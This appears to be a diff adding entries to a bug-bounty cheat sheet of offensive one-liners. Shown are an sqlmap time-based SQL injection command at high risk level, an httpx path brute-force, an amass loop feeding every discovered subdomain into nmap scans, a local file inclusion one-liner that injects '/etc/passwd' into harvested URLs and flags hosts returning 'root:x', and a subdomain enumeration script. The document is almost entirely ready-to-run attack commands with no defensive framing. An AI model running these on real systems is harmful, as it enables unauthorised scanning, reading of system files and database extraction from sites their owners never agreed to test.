@@ -14,8 +14,33 @@ Ghauri Command
 SQLMAP Command
 ~ > sqlmap -r sqli-req.txt --current-db --technique=T --dbms=MySQL --level=2 --risk=3 --random-agent --no-cast
 
+HTTPX Command
+~ > cat domains.txt | httpx -path wordlist.txt -fc 400,403,404
+
+# Noobtip Find Subdomains via @owasp amass and performa quick scan of all discovered subdomains via NMAP.
+~ > amass db -show -d TARGET 2>/dev/null | grep TARGET | while read HOST; do nmap -sC -v -Pn $HOST; done
+
+Local File Inclusion : by @dwisiswant0
+~ > gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -C 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 
 
+
+-------------------------------------------------------------------------------------
+# ReconOne # 1
+
+#!/bin/bash
+# $1 => example.domain
+
+amass enum --passive -d $1 -o domains_$1
+assetfinder --subs-only $1 | tee -a domains_$1
+
+subfinder -d $1 -o domains_subfinder_$1
+cat domains_subfinder_$1 | tee -a domain_$1
+
+# filtering the domains
+sort -u domains_$1 -o domains_$1
+cat domains_$1 | filter-resolved | tee -a domains_$1.txt
+----------------------------------------------------------------------------------------
 
 
 
